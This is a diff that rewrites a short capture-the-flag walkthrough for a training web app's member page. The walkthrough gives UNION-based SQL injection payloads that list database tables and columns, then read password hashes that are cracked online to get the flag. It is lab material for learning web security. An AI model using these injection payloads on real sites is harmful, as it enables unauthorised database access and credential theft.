@@ -1,14 +1,14 @@
-Page : http://localhost:8080/index.php?page=member
+Forms must be protected in order to stop an attacker from introducing malicious
+code or executing database queries. In this case, we have a vulnerable form that
+lets us execute SQL requests and find all the information about whats inside
+the database
 
-To get tables names => 
-1 AND 1=2 UNION SELECT table_schema, table_name FROM information_schema.tables
-
-To get column names from all tables
-1 or 1=2 UNION select table_name, column_name FROM information_schema.columns
-
-To request on the SQL_INJECTION Table =>
-1 AND 1=2 UNION SELECT Countersign, COMMENTAIRE FROM Member_Sql_Injection.users 
-
-Password decrypted via : https://md5hashing.net/hash/sha256
-
-Then found FortyTwo, lowered its characters and sha256 on it to get the flag
+1. Navigate to /index.php?page=member
+2. Write the following command in the form and submit to list the table names:
+   - 1 AND 1=2 UNION SELECT table_schema, table_name FROM information_schema.tables
+3. Write the following command in the form and submit to list the column names:
+   - 1 or 1=2 UNION select table_name, column_name FROM information_schema.columns
+4. Write the following command in the form and submit to read sensitive information:
+   - 1 AND 1=2 UNION SELECT Countersign, COMMENTAIRE FROM Member_Sql_Injection.users
+5. Decrypt the password via : https://md5hashing.net/hash/sha256 => FortyTwo
+6. Lowered its characters and sha256 on it to get the flag
